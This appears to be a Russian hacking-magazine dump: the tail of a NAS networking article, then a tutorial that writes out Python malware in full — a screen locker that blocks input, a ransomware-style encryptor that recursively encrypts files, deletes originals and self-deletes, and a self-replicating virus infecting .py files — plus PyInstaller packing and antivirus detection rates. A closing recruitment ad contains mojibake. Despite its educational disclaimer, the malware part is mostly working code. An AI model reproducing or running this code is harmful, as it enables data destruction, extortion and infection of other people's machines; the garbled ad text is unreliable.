 • QNA‐UC5G1T — адаптер с выходом USB Type‐C с поддержкой стандартов
   на 5 и 2,5 Гбит (10Gbe нет) на чипсете AQtion AQC111U. Подходит боль‐
  шинству современ ных устройств, работающих на процессорах Intel (спи‐
   сок исклю чений ищи на странице продукта). Достаточно крупный адаптер
   в увесистом металличес ком корпусе. Можно устанавливать несколько
   в одно устройство, рас познается автоматически. Спойлер: этот адаптер
  можно использовать и с NAS от Synology; об этом ниже. А вот в компьютер
   я бы все‐таки установил нормальную сетевую карту — это и быс трее,
   и дешевле, и гораздо меньше нагружает процессор. Цена — око‐
   ло 100 евро.





                    QNAP QNA‐UC5G1T


QNAP: под водные камни
Использование сетевых плат или адап теров производства QNAP совмес тно
с NAS от QNAP ожидаемо не вызывает никаких проб лем. Главное — уточнить
совместимость до того, как купишь адаптер. В целом вариант с портом USB
(QNA‐UC5G1T) подой дет почти для любого относительно свежего хранилища
от QNAP, если последнее осна щено процессором  Intel. Для того чтобы
получить повышенную полосу пропус кания в решениях на ARM, тебе придет‐
ся воспользоваться агрегацией портов, если устройство оснащено больше
чем двумя портами Ethernet.
   Каких неприятных сюрпризов стоит ожидать? Традици онно при исполь‐
зовании адаптера с USB не будет работать Wake On LAN: NAS от QNAP
отключают питание пор тов USB, и «волшебный пакет» уходит в никуда. Обой‐
ти проблему можно, подключив отдельный сетевой кабель к одному из встро‐
енных портов Ethernet. Кроме того, в некото рых корпусах имеет смысл уста‐
навливать модели адаптеров с активным охлаждением — в противном случае
возможен  температурный  тротлинг  (осо бенно  это  касается  адаптера
на 10 Гбит).


Asustor
Asustor производит достаточно интерес ные NAS, которые особо не за что
поругать. Интересен подход компании к реализации мультигигабитных сетей.
В линейке Asustor есть несколько моделей, осна щенных дву мя портами 10G‐
BASE‐T (как ни странно, именно эти модели оборудо ваны довольно слабыми
процессорами ARM), и две с дву мя портами 2.5GBASE‐T (это модели Nimbus‐
tor 2 и 4). Связываться с решениями на ARM ради 10‐гигабитных портов я бы
не стал, а вот Nimbustor вполне интерес ны — в основном тем, что быстрый
линк будет работать сразу из коробки.
  Для  всех  остальных  предлагается  вот  такой  простенький  адаптер
со встроенным (в отличие от QNAP) шнурком USB Type‐C.





                              Asustor AS‐U2.5G

Адаптер Asustor AS‐U2.5G — всего лишь обычный референсный дизайн
на основе недорогого контроллера Realtek RTL8156. На этом же контроллере
выпол нены такие адаптеры, как Cable Matters 201090‐E (Type‐C), Plannex USB‐
LAN2500R (Type‐A), Buﬀalo LUA‐U3‐A2G (Type‐A), CLUB 3D CAC‐1420 (Type‐A),
TUC‐ET2G (Type‐C), CableCreation B07VNFLTLD (Type‐A),  Digitus DN‐3025
(Type‐C), довольно симпатично выглядящий DeLOCK 65990 и множество им
подобных.





                                  Digitus DN‐3025

Как «родной» адаптер Asustor, так и его многочис ленные клоны на том же чип‐
сете устанавливаются и работают в NAS Asustor в режиме plug’n’play. Из нас‐
троек, пожалуй, стоит лишь включить Jumbo Frames (MTU = 9000). В частнос‐
ти, я протестировал адаптер Digitus DN‐3025 — никакой особой при чины
выбрать из многочисленных кло нов именно его у меня не было, остальные
должны работать аналогичным обра зом.


Тес товый стенд
Двухдисковая Asustor AS6302T, обо рудованная дву мя гигабитными портами
Ethernet, процессором Intel Celeron J3350 (Apollo Lake) и двумя дисками WD
Red 6TB WD60EFRX (максимальная скорость чтения в тес тах — поряд‐
ка 221 Мбайт/с на внешних дорожках). Диски работают по отдельнос ти (при
попытке создать «зеркало» ADM начала процесс пол ной синхронизации мас‐
сива, что грозило растянуться часов на двадцать).


Подводные камни? Традиционно — с адаптером не будет работать Wake
On LAN. Сто ит оставить подклю ченным один из встроенных портов Ethernet.
В список совместимых входят практичес ки все модели Asustor на процес‐
сорах Intel: линейки AS31, 32, 50, 51, 52, 53, 61, 62, 63, 64, 70.


Asustor: агре гация лин ков
В большинстве NAS производс тва Asustor, работающих на процессорах Intel,
присутствует не один, а два сетевых порта. Если у тебя уже есть мультигига‐
битный коммутатор, а в компьютере уста новлена сетевая карта с поддер‐
жкой 10GBASE‐T, то покупать дополнительный адаптер для NAS, возможно,
и не потребуется. Агрегация лин ков в ADM вклю чается буквально в несколько
кликов, причем никаких настроек в коммутаторе тебе делать не придется:
реализована агрегация на программном уровне.
   Агрегация линков — достаточно нет ривиальный процесс, который раз‐
работчики ADM упростили до невозможности. Что бы получить удвоенную
полосу пропускания, достаточно включить агрегацию в настрой ках, а в качес‐
тве метода выбрать алго ритм Round‐Robin, как показано на скриншоте.





К слову, выбор любого дру гого алгоритма пот ребует поддержки со стороны
коммутатора, при этом удвоения полосы про пус кания ты не получишь.
  В результате име ем NAS, подклю ченный к двум гигабитным портам ком‐
мутатора двумя кабелями Ethernet Cat. 5e или выше, и компьютер, подклю‐
ченный к мультигигабитному порту того же коммутатора одним кабелем Cat.
6a или более высокой категории. Вот что получается в итоге (в NAS установ‐
лена пара дисков WD Red 6TB WD60EFRX).





                         На чтение





                         На запись

Надо понимать, что ограничивающим фактором здесь становится скорость
работы жесткого диска. Вот так выглядит копирование файла, целиком
поместивше гося в кеш NAS.





Кстати, указанные выше цифры получены с MTU = 9000. С размером MTU
по умолчанию скорость записи в режиме агрегации резко падает, так что сто‐
ит настроить MTU как на стороне NAS, так и на своем компьюте ре.
   Как видишь, использование более широкого канала не всегда приведет
к удвоенной производительнос ти. Единичный гигабитный канал позволяет
передавать порядка 120 Мбайт/с, удвоенный же дает реальную произво‐
дительность в районе 171 Мбайт/с, которая тем не менее не достигает мак‐
симальной скорости самого диска (напомню, в данном стенде — 210 Мбайт/
с). Предельная скорость (чтение из кеша NAS) — около 195 Мбайт/с.
  К слову, тот же NAS был протестирован и с адаптером Digitus DN‐3025,
подклю ченным к порту USB Type‐C. Результат был неразличим до степени
смешения: ограничивающим фактором ста ла скорость доступа к самим дис‐
кам. В итоге я решил отдать мультигигабитный порт в коммутаторе в пользу
Synology, а для Asustor использовать агрегацию.


Synology
И вот мы дошли до самого, наверное, увлекательного в этой статье: настрой‐
ки мультигигабитного канала в NAS от Synology. В моем рас поряжении есть
единственная модель — DS218+. Эта модель интерес на еще и тем, что ее
платформа очень похожа на ранее протес тированный Asustor AS6302T. Тот же
процессор, те же диски (хоть и в зеркальной конфигурации), но при этом —
единственный гигабитный сетевой интерфейс. Увеличить скорость доступа
штатными средствами невозможно — только переходить на более дорогую
модель, оборудованную двумя портами Ethernet.


Тес товый стенд
Двухдисковая Synology DS218+, оборудо ванная единственным гигабитным
портом Ethernet, процессором Intel Celeron J3350 (Apollo Lake) и дву мя дис‐
ками WD Red 6TB WD60EFRX (максимальная скорость чтения в тестах —
порядка 221 Мбайт/с на внешних дорожках). Диски объ единены в зеркальный
массив RAID 1.


Synology славится умением за хорошие деньги продать самое минимально
достаточное с аппаратной точки зрения устройства. Так, если у Asustor
AS6302T мы наблюдаем два гигабитных порта и дополнительно разъ ем Type‐
C, то в модели DS218+, осна щенной тем же процессором и таким же количес‐
твом оперативной памяти, слота Type‐C нет вовсе, а гигабитный сетевой порт
всего один. Более того, Synology не предлага ет никакой штатной возможнос‐
ти как‐то расширить канал: ни мультигига битных адаптеров, ни даже воз‐
можности подключить через USB вто рой гигабит ный адаптер не пре дус‐
мотрено (а если тебе это каким‐то образом удастся, то настраивать агре‐
гацию линков ты будешь вручную через терминал).
   Если у тебя одна из подобных моделей, а менять ее на более продвинутый
вариант (например, DS718+ или четырехдисковую модель) ты не хочешь, то
описанный ниже способ может тебе подойти.


Вариант 1. Используем 5-гигабитный адаптер QNA-UC5G1T
на чипсете AQtion AQC111U
Разумеется, если ты прос то подклю чишь адаптер комплектным кабелем, DSM
не увидит сетевого лин ка. Нужен драйвер для AQC111U, который Synology,
само собой, не предлагает. На помощь приходит GitHub: драйверы для чип‐
сета AQC111U в понятном для DSM виде можно ска чать отсюда.
  В список совместимых моделей входят DS918+, DS620slim, DS1019+,
DS718+, DS418play, а также DS218+. Впрочем, сборки доступны и для гораз до
более старых чипсетов, так что проапгрейдить таким образом можно и весь‐
ма древние модели Synology.
   Устанавливается драйвер предельно просто: достаточно использовать
команду Manual Install из раздела Packages. После установки драйвер ста‐
новится доступным в виде уста новленного пакета; его нужно будет запустить.





После этого драйвер готов к работе, но рекомендуется его предварительно
настроить, изме нив в свойствах адаптера MTU = 9000. В настройках адаптер
будет выглядеть примерно так.





На этом не все. 5‐гигабитный адаптер склонен к наг реву, а где нагрев — там
и тротлинг. Соответственно, сто ит отключить температурный тротлинг, а что‐
бы не возникал перегрев — вклю чить EEE (Energy Eﬃcient Ethernet). Это мож‐
но сделать двумя командами в терминале (предполагается, что идентифика‐
тор подключения — eth1, что верно для систем с единственным встроенным
сетевым портом):


$ ethtool ‐‐set‐priv‐flags eth1 "Thermal throttling" off
$ ethtool ‐‐set‐priv‐flags eth1 "Low Power 5G" on

После указанных манипу ляций линк полностью готов к работе. Обрати вни‐
мание: WOL через USB‐адаптер работать не будет; если ты пользуешься
WOL, оставь подклю ченным основной кабель. В таком слу чае тебе при дется
убедиться в корректной адресации, в явном виде подключаясь к IP‐адресу
именно 5‐гигабитного адаптера. Я решил этот воп рос, настроив локальное
название устройства в виде my_nas.local (при этом просто my_nas обращает‐
ся к устройству через встро енный LAN), но вариантов может быть масса,
вплоть до редактирования файла hosts на своем компьютере.
  Я провел  стресс‐тест  это го адаптера, передав через него поряд‐
ка 10 Тбайт дан ных. Никаких проблем не воз никло, перегрев не наблюдал ся.
Стоило ли оно того? Вот результаты тес тирова ния.
   Чтение показало устоявшу юся скорость 150 Мбайт/с.





Пиковая производитель ность — порядка 178 Мбайт/с.





Запись в зашифрованную папку (AES‐256) прош ла со средней скоростью
около 140 Мбайт/с, при этом заметно нагрузив про цессор.





Эксперимент считаю удавшимся: достигну та скорость передачи данных, поч‐
ти в полтора раза превышающая возможности гигабитного линка. Впрочем,
до скоростей DAS данному решению все же далеко: вероятно, играет роль
весьма скромная вычислительная мощность ста ренького двухъядерного
Celeron.


Вариант 2. Используем 2,5-гигабитный адаптер на чипсете Real-
tek RTL8156
Я протестировал вот такой адаптер, продава емый под маркой Digitus.





                                  Digitus DN‐3025

На чипсете RTL8156 сущес тву ет большое количес тво клонов, которые отли‐
чаются внеш ним видом корпуса и спо собами отво да тепла. Драйвер для всех
этих адаптеров подходит один и тот же.
  Обрати внимание: у этой модели разъем Type‐C. Для подключения к Synol‐
ogy потребовался китайский переходник, у которого есть своя особенность:
на полной скорости он работа ет только в одной ори ентации симметричного
порта Type‐C. Если «воткнуть неправиль но», ско рость будет как у USB 2.0.
  Разумеется, драйверов у Synology для этого адаптера не предусмотрено.
На помощь вновь приходит GitHub: на сей раз нас интересу ет страница Synol‐
ogy DSM driver for Realtek RTL8152/RTL8153/RTL8156 based adapters.
   Установка не отличается от уста новки предыдущего адаптера. Из допол‐
нительных настроек имеет смысл активировать Jumbo Frames (MTU 9000), что
помогает снизить загрузку процес сора и нагрев самого адаптера. Краткое
тестирование подтвердило работос пособ ность комбинации.


Под водные кам ни
 • Какие бывают подводные камни у сетевых адаптеров, работающих через
  USB? Во‐первых, ни одно из рассмотренных решений не поддерживает
  функцию WOL; это, впро чем, ожидаемо. Во‐вто рых, работа через USB —
   относительно тяжелая для процес сора нагрузка; при передаче больших
  массивов  данных  на  максимальной  скорости  загрузка  слабенького
   Celeron, который сто ит в протестированных NAS, достигала 25–30%.
  К сожалению, провести корректное сравнение не удалось, но при исполь‐
   зовании гигабитного встроенно го адаптера загрузка процес сора при ана‐
   логичной нагрузке не превышала 5–10%.
 • Использование адаптера от QNAP совместно с NAS от Synology может
   привести к перегреву адаптера и падению скорос ти до 100 Мбит/с. Реша‐
   ется рекомендованными автором порта командами, которые отключают
   температурный  тротлинг  и  активиру ют режим EEE  (Energy  Eﬃcient
   Ethernet), и настрой кой в свойствах адаптера Jumbo Frames (MTU = 9000)
   как на самом NAS, так и на сто роне компь юте ра. Пос ле этих манипуляций
   адаптер работал ста бильно, успешно пройдя 20‐часовой стресс‐тест
   с максимальной нагрузкой.
 • Драйверы адаптеров Realtek для устрой ств Synology, похоже, не самого
   высокого качества: в журнале повторя ется одна и та же ошиб ка. А вот
   в  устройствах  Asustor,  для  которых данный  чипсет поддерживается
   на нативном уровне, никаких ошибок не регистрируется.




ЗАКЛЮЧЕНИЕ
Подробно разобравшись в том, как обес печить мультигигабитную ком‐
мутацию в домашней сети, попробуем ответить на вопрос: стоило ли оно
того? Начиная исследование, я ставил перед собой цель обеспечить между
компьютером и двумя сетевыми устройствами (NAS Asustor и Synology) ско‐
рость передачи данных сравнимую с той, которую дает пря мое подключение
дисков к компьютеру. Своей цели я добился: коммутация между компьюте ром
и Synology DS218+ идет по 5‐гигабитному каналу, а с Asustor AS6302T —
по двум гигабитным. В сравнении с использованием одного гигабитного лин‐
ка прирост производительнос ти полуторакратный. А вот практической раз‐
ницы между 5‐гигабитным лин ком в Synology и агре гаци ей двух каналов
в Asustor я не увидел: выше головы не прыгнешь, быс трее дисков данные
не прочитаешь. Уверен, использование более быстрых накопителей эту раз‐
ницу смогло бы продемонс трировать.
  Можно ли было обойтись без мультигига битного коммутатора и соответс‐
твующей сетевой карты? В случае с Asustor — впол не можно было бы
добавить в компьютер второй гигабитный порт и настроить агрегацию. А вот
к DS218+ быстрый доступ мне получить не удалось бы: в этой модели сетевой
интерфейс предусмотрен только один, а добавить второй гигабитный адап‐
тер просто так не получится.
КОДИНГ

   ЯДОВИТЫЙ
ПИТОН





        ПИШЕМ НА PYTHON
      ПРОСТЕЙШУЮ МАЛВАРЬ:
    ЛОКЕР, ШИФРОВАЛЬЩИК И ВИРУС




Почему кому‐то может прийти в голову
писать малварь на Python? Мы сде лаем
это, чтобы изучить общие принципы вре‐
доносос троения, а заодно ты попракти‐                                                                          Валерий Линьков
куешься  в  использовании  это го  языка      специалистДипломированныйи инструктор Cis‐
и сможешь применять полученные зна ния       co,co, основательавтор техническихакадемиистатейCis‐
в других целях. К тому же малварь на Python        нацбезопасностисисадмин, ИБшник,России,
                                                                                                 питонист, гик
таки попадается в дикой природе, и далеко                valerylinkov.ru
не все антивирусы обра щают на нее вни‐
мание.


Чаще всего Python применяют для создания бэкдоров в софте, чтобы заг‐
ружать и исполнять любой код на зараженной машине. Так, в 2017 году сот‐
рудники компании Dr.Web об наружили Python.BackDoor.33, а 8 мая 2019 года
был замечен Mac.BackDoor.Siggen.20. Дру гой тро ян — RAT Python крал поль‐
зовательские данные с зараженных устройств и использовал  Telegram
в качестве канала переда чи данных.
  Мы же создадим три демонс трационные программы: локер, который будет
блокировать доступ к компь ютеру, пока пользователь не введет правильный
пароль, шифровальщик, который будет обходить директории и шиф ровать
все лежащие в них файлы, а также вирус, который будет распространять свой
код, заражая другие прог раммы на Python.


             INFO

                       Тема удаленного администрирования зараженных
                    машин осталась за рамками этой статьи, однако
                      ты можешь почерпнуть основу для кода со всеми
                      объяснениями в статье «Reverse shell на Python».


Несмотря на то что наши тво рения не претендуют на сколько‐нибудь высокий
технический уровень, они в определен ных усло виях могут быть опасными.
Поэтому предупреждаю, что за нарушение работы чужих компьюте ров и унич‐
тожение информации может последовать стро гое наказание. Давай сразу
договоримся: запускать все, что мы здесь описываем, ты будешь только
на своей машине, да и то осто рожно — чтобы случайно не зашифровать себе
весь диск.


           WARNING

                      Вся информация предоставлена исключительно
                        в ознакомительных целях. Ни автор, ни редакция
                      не несут ответственности за любой возможный
                        вред, причинен ный материалами данной статьи.



НАСТРОЙКА СРЕДЫ
Итак, первым делом нам, конечно, понадобится сам Python, причем третьей
версии. Не буду детально рас писывать, как его устанавливать, и сразу
отправлю тебя скачивать бес платную книгу «Укус питона» (PDF). В ней ты най‐
дешь ответ на этот и мно гие дру гие воп росы, свя занные с Python.
  Дополнительно установим нес колько модулей, которые будем исполь‐
зовать:


pip install pyAesCrypt
pip install pyautogui
pip install tkinter

На этом с подготовительным эта пом покончено, мож но приступать к написа‐
нию кода.


ЛОКЕР
Идея — создаем окно на полный экран и не даем поль зовате лю закрыть его.
  Импорт библиотек:


import pyautogui
from tkinter import Tk, Entry, Label
from pyautogu соi import click, moveTo
from time import sleep

Теперь возьмемся за основную часть прог раммы.


# Создаем окно
root = Tk()
# Вырубаем защиту левого верхнего угла экрана
pyautogui.FAILSAFE = False
# Получаем ширину и высоту окна
width = root.winfo_screenwidth()
height = root.winfo_screenheight()
# Задаем заголовок окна
root.title('From "Xakep" with love')
# Открываем окно на весь экран
root.attributes("‐fullscreen", True)
# Создаем поле для ввода, задаем его размеры и расположение
entry = Entry(root, font=1)
entry.place(width=150, height=50, x=width/2‐75, y=height/2‐25)
# Создаем текстовые подписи и задаем их расположение
label0 = Label(root, text="╚(•⌂•)╝ Locker by Xakep (╯°□°）╯︵ ┻━┻",
font=1)
label0.grid(row=0, column=0)
label1 = Label(root, text="Пиши пароль и жми Ctrl + C", font='Arial
20')
label1.place(x=width/2‐75‐130, y=height/2‐25‐100)
# Включаем постоянное обновление окна и делаем паузу
root.update()
sleep(0.2)
# Кликаем в центр окна
click(width/2, height/2)
# Обнуляем ключ
k = False
# Теперь непрерывно проверяем, не введен ли верный ключ
# Если введен, вызываем функцию хулиганства
while not k:
    on_closing()

Здесь pyautogui.FAILSAFE  =  False — защита, которая акти виру ется
при перемещении курсора в верхний левый угол экрана. При ее срабаты‐
вании программа закрывается. Нам это не надо, поэтому вырубаем эту фун‐
кцию.
   Чтобы наш локер работал на любом мониторе с любым разрешением,
считываем ширину и высоту экрана и по прос той формуле вычисляем, куда
будет попадать курсор, делать ся клик и так далее. В нашем случае курсор
попадает в центр экрана, то есть ширину и высоту мы делим на два. Паузу
(sleep) добавим для того, чтобы пользователь мог ввести код для отмены.
  Сейчас мы не блокировали ввод текста, но можно это сделать, и тогда
пользователь никак от нас не избавится. Для этого напишем еще немного
кода. Не советую делать это сразу. Сна чала давай настроим программу, что‐
бы она выключалась при вводе пароля. Но код для блокирования клавиатуры
и мыши выглядит вот так:


import pythoncom, pyHook


hm = pyHook.HookManager()
hm.MouseAll = uMad
hm.KeyAll = uMad
hm.HookMouse()
hm.HookKeyboard()
pythoncom.PumpMessages()

Создадим функцию для ввода ключа:


def callback(event):
    global k, entry
    if entry.get() == "xakep":
        k = True

Тут все просто. Если ключ не тот, который мы задали, программа продолжает
работать. Если пароли совпали — тормозим.
  Последняя функция, которая нужна для работы окна‐вредителя:


def on_closing():
    # Кликаем в центр экрана
    click(width/2, height/2)
    # Перемещаем курсор мыши в центр экрана
    moveTo(width/2, height/2)
    # Включаем полноэкранный режим
    root.attributes("‐fullscreen", True)
    # При попытке закрыть окно с помощью диспетчера задач вызываем
on_closing
    root.protocol("WM_DELETE_WINDOW", on_closing)
    # Включаем постоянное обновление окна
    root.update()
    # Добавляем сочетание клавиш, которое будет закрывать программу
    root.bind('<Control‐KeyPress‐c>', callback)

На этом наш импровизи рованный локер готов.


ШИФРОВАЛЬЩИК
Этот вирус мы напишем при помощи только одной сторонней библиотеки —
pyAesCrypt. Идея — шифруем все фай лы в указанной директории и всех
директориях ниже. Это важное огра ничение, которое позволяет не сломать
операционку. Для работы создадим два файла — шифратор и дешифратор.
После работы исполняемые файлы будут само уда лять ся.
  Сначала запрашиваем путь к атакуемому катало гу и пароль для шиф‐
рования и дешифровки:


direct = input("Напиши атакуемую директорию: ")
password = input("Введи пароль: ")

Дальше мы будем генерировать скрип ты для шифрования и дешифровки.
Выглядит это примерно так:


with open("Crypt.py", "w") as crypt:
    crypt.write('''
    текст программы
    ''')

Переходим к файлам, которые мы будем использовать в качестве шаб лонов.
Начнем с шифратора. Нам потребуются две стандартные библиотеки:


import os
import sys

Пишем функцию шифрования (все по мануалу pyAesCrypt):


def crypt(file):
    import pyAesCrypt
    print('‐' * 80)
    # Задаем пароль и размер буфера
    password = "'''+str(password)+'''"
    buffer_size = 512*1024
    # Вызываем функцию шифрования
    pyAesCrypt.encryptFile(str(file), str(file) + ".crp", password,
buffer_size)
    print("[Encrypt] '"+str(file)+".crp'")
    # Удаляем исходный файл
    os.remove(file)

Вместо str(password) скрипт‐генератор вста вит пароль.
  Важные нюансы. Шиф ровать и дешифровать мы будем при помощи
буфера, таким образом мы избавимся от огра ничения на размер файла (по
крайней   мере,   значитель но  уменьшим   это   ограниче ние).  Вызов
os.remove(file) нужен для уда ления исходного файла, так как мы копиру ем
файл и шифруем копию. Можно нас троить копиро вание фай ла вместо уда‐
ления.
   Теперь функция, которая обходит папки. Тут тоже ничего сложного.


def walk(dir):
    # Перебор всех подпапок в указанной папке
    for name in os.listdir(dir):
        path = os.path.join(dir, name)
        # Если это файл, шифруем его
        if os.path.isfile(path):
            crypt(path)
        # Если это папка, рекурсивно повторяем
        else:
            walk(path)

В конце добавим еще две строки. Одна для запуска обхода, вторая —
для самоуничтожения программы.


walk("'''+str(direct)+'''")
os.remove(str(sys.argv[0]))

Здесь снова будет подставлять ся нужный путь.
   Вот весь исходник целиком.


import os
import sys


def crypt(file):
    import pyAesCrypt
    print('‐' * 80)
    password = "'"+str(password)+"'"
    buffer_size = 512*1024
    pyAesCrypt.encryptFile(str(file), str(file) + ".crp", password,
buffer_size)
    print("[Encrypt] '"+str(file)+".crp'")
    os.remove(file)


def walk(dir):
    for name in os.listdir(dir):
        path = os.path.join(dir, name)
        if os.path.isfile(path):
            crypt(path)
        else:
            walk(path)


walk("'''+str(direct)+'''")
print('‐' * 80)
os.remove(str(sys.argv[0]))

Теперь «зеркальный» файл. Если в шифроваль щике мы писали encrypt, то
в дешифраторе пишем decrypt. Повторять раз бор тех же строк нет смысла,
поэтому сразу финальный вариант.


import os
import sys


# Функция расшифровки
def decrypt(file):
    import pyAesCrypt
    print('‐' * 80)
    password = "'''+str(password)+'''"
    buffer_size = 512 * 1024
    pyAesCrypt.decryptFile(str(file), str(os.path.splitext(file)[0]),
 password, buffer_size)
    print("[Decrypt] '" + str(os.path.splitext(file)[0]) + "'")
    os.remove(file)


# Обход каталогов
def walk(dir):
    for name in os.listdir(dir):
        path = os.path.join(dir, name)
        if os.path.isfile(path):
            try:
                decrypt(path)
            except Error:
                pass
        else:
            walk(path)


walk("'''+str(direct)+'''")
print('‐' * 80)
os.remove(str(sys.argv[0]))

Итого 29 строк, из которых на дешифровку ушло три. На слу чай, если какой‐то
из файлов вдруг окажется поврежденным и возникнет ошибка, пользуемся
отловом исключений (try...except). То есть, если не получится расшифро‐
вать файл, мы его просто пропускаем.


ВИРУС
Здесь идея в том, чтобы соз дать прог рамму, которая будет заражать другие
программы с указанным рас ширением. В отличие от настоящих вирусов,
которые заражают любой исполня емый файл, наш будет поражать только
другие программы на Python.
  На этот раз нам не потребуются никакие сторонние библиотеки, нужны
только модули sys и os. Подключаем их.


import sys
import os

Создадим три функции: сообщение, парсер, заражение.
  Функция, которая сооб щает об атаке:


def code(void):
    print("Infected")

Сразу вызовем ее, чтобы понять, что программа отра ботала:


code(None)

Обход директорий похож на тот, что мы делали в шифровальщике.


def walk(dir):
    for name in os.listdir(dir):
        path = os.path.join(dir, name)
        # Если нашли файл, проверяем его расширение
        if os.path.isfile(path):
            # Если расширение — py, вызываем virus
            if (os.path.splitext(path)[1] == ".py"):
                virus(path)
            else:
                pass
        else:
            # Если это каталог, заходим в него
            walk(path)


             INFO

                   В  теории мы  могли бы  таким же  образом
                        отравлять исходники и на других языках, добавив
                       код на этих языках в файлы с соответствующими
                       расширениями.  А  в  Unix‐образных  системах
                       скрипты на Bash, Ruby, Perl и подоб ном можно
                      просто под менить скрип тами на Python, исправив
                         путь к интерпретато ру в первой строке.


Вирус будет заражать файлы «вниз» от того каталога, где он находится (путь
мы получаем, вызвав os.getcwd()).
  В начале и в конце файла пишем вот такие комментарии:


# START #
# STOP #

Чуть позже объясню зачем.
   Дальше функция, которая отвечает за саморепликацию.


def virus(python):
    begin = "# START #\n"
    end = "# STOP #\n"
    # Читаем атакуемый файл, назовем его copy
    with open(sys.argv[0], "r") as copy:
        # Создаем флаг
        k = 0
        # Создаем переменную для кода вируса и добавляем пустую
строку
        virus_code = "\n"
        # Построчно проходим заражаемый файл
        for line in copy:
            # Если находим маркер начала, поднимаем флаг
            if line == begin:
                k = 1
                # Добавляем маркер в зараженный код
                virus_code += begin
            # Если мы прошли начало, но не дошли до конца, копируем
строку
            elif k == 1 and line != end:
                virus_code += line
            # Если дошли до конца, добавляем финальный маркер и
выходим из цикла
            elif line == end:
                virus_code += end
                break
            else:
                pass
    # Снова читаем заражаемый файл
    with open(python, "r") as file:
        # Создаем переменную для исходного кода
        original_code = ""
        # Построчно копируем заражаемый код
        for line in file:
            original_code += line
            # Если находим маркер начала вируса, останавливаемся и
поднимаем флаг vir
            if line == begin:
                vir = True
                break
            # Если маркера нет, опускаем флаг vir
            else:
                vir = False
    # Если флаг vir опущен, пишем в файл вирус и исходный код
    if not vir:
        with open(python, "w") as paste:
            paste.write(virus_code + "\n\n" + original_code)
    else:
        pass

Теперь, думаю, стало понятнее, зачем нуж ны метки «старт» и «стоп». Они
обозначают начало и конец кода вируса. Сперва мы читаем файл и пос трочно
просматриваем его. Когда мы наткнулись на стартовую метку, под нимаем
флаг. Пустую строку добавляем, что бы вирус в исходном коде начинался
с новой строки. Читаем файл вто рой раз и записываем пос трочно исходный
код. Последний шаг — пишем вирус, два отступа и оригинальный код. Можно
поиздеваться и записать его как‐нибудь по‐особому — например, видоизме‐
нить все выводимые строки.


ДЕЛАЕМ ИСПОЛНЯЕМЫЙ ФАЙЛ
Как запустить вирус, написанный на скриптовом язы ке, на машине жертвы?
Есть два пути: либо как‐то убедиться, что там установлен интерпретатор,
либо запаковать наше творение вместе со всем необходимым в единый
исполняемый файл. Этой цели служит утилита PyInstaller. Вот как ей поль‐
зоваться.
   Устанавливаем:


pip install PyInstaller

И вводим команду


PyInstaller "имя_файла.py" ‐‐onefile ‐‐noconsole

Немного ждем, и у нас в папке с программой появляется куча фай лов.
Можешь смело избавлять ся от всего, кроме экзешников, они будут лежать
в папке dist.
   Говорят, что с тех пор, как начали появлять ся вредонос ные программы
на Python, антивирусы ста ли крайне нервно реагировать на PyInstaller, при чем
даже если он прилагается к совершенно безопас ной программе.
  Я решил проверить, что VirusTotal скажет о моих творениях. Вот отчеты:
 • файл Crypt.exe не понравился 12 анти виру сам из 72;
 • файл Locker.exe — 10 антивиру сам из 72;
 • файл Virus.exe — 23 антивиру сам из 72.

Худший результат показал Virus.exe — то ли некоторые антивиру сы обратили
внимание на саморепликацию, то ли прос то название файла не понравилось.
Но как видишь, содержимое любого из этих файлов нас торожило далеко
не все антивирусы.


ЗАКЛЮЧЕНИЕ
Итак, мы написали три вредоносные программы, использовав скриптовый
язык, и упаковали их при помощи PyInstaller.
  Безусловно, наш вирус — не самый страшный на свете, а локер и шиф‐
ровальщик еще нужно как‐то доставлять до машины жертвы. При этом
ни одна из наших программ не общается с C&C‐сервером и я совсем
не обфусци ровал  код,  так что здесь оста ется еще огромный простор
для творчества.
  Тем не менее уровень детекта антивиру сами ока зался на удивление низ‐
ким. Получается, что даже самая прос тая самопис ная мал варь может стать
угрозой. Так что антивиру сы антивирусами, но ска чивать из интернета слу‐
чайные программы и запус кать их не думая всег да будет небезопас но.


        WWW

                     •Полные версии исходных файлов
   СТАНЬ АВТОРОМ
     «ХАКЕРА»!


«Хакеру» нужны новые авторы, и ты можешь стать одним
из них! Если тебе интересно то, о чем мы пишем, и есть
желание исследовать эти темы вместе с нами, то не упусти
возможность вступить в ряды наших авторов и получать
за это все, что им причитается.


 • Àâòîðû ïîëó÷àþò äåíåæíîå âîçíàãðàæäåíèå. Размер  зависит
   от сложности и уникальности темы и объема проделанной работы (но
   не от объема текста).
 • Íàøè àâòîðû ÷èòàþò «Õàêåð» áåñïëàòíî: каждая опубликованная
   статья приносит месяц подписки и значительно увеличивает личную скид-
    ку. Уже после третьего раза подписка станет бесплатной навсегда.

Кроме того, íàëè÷èå ïóáëèêàöèé — ýòî îòëè÷íûé ñïîñîá ïîêàçàòü
ðàáîòîäàòåëþ è êîëëåãàì, ÷òî òû â òåìå. А еще мы планируем запуск
англоязычной версии, так что ó òåáÿ áóäåò øàíñ áûòü óçíàííûì è çà
ðóáåæîì.
  И конечно, ìû âñåãäà óêàçûâàåì â ñòàòüÿõ èìÿ èëè ïñåâäîíèì
àâòîðà. На сайте ты можешь сам заполнить характеристику, поставить фото,
написать что-то о себе, добавить ссылку на сайт и профили в соцсетях. Или,
наоборот, не делать этого в целях конспирации.


ß ÒÅÕÍÀÐÜ, À ÍÅ ÆÓÐÍÀËÈÑÒ. ÏÎËÓ×ÈÒÑß ËÈ Ó ÌÅÍß ÍÀÏÈÑÀÒÜ
ÑÒÀÒÜÞ?
Главное в нашем деле — знания по теме, а не корочки журналиста. Знаешь
тему — значит, и написать сможешь. Не умеешь — поможем, будешь сом-
неваться — поддержим, накосячишь — отредактируем. Не зря у нас работает
столько редакторов! Они не только правят буквы, но и помогают с темами
и форматом и «причесывают» авторский текст, если в этом есть необ-
ходимость. И конечно, перед публикацией мы согласуем с автором все прав-
ки и вносим новые, если нужно.


ÊÀÊ ÏÐÈÄÓÌÀÒÜ ÒÅÌÓ?
Темы для статей — дело непростое, но и не такое сложное, как может
показаться. Стоит начать, и ты наверняка будешь придумывать темы одну
за другой!
  Первым делом задай себе несколько простых вопросов:
 • «Ðàçáèðàþñü ëè ÿ â ÷åì‑òî, ÷òî ìîæåò çàèíòåðåñîâàòü äðóãèõ?»
   Частый случай: люди делают что-то потрясающее, но считают свое
   занятие вполне обыденным. Если твоя мама и девушка не хотят слушать
   про реверс малвари, сборку ядра Linux, проектирование микропроцес-
   соров или хранение данных в ДНК, это не значит, что у тебя не найдется
   благодарных читателей.
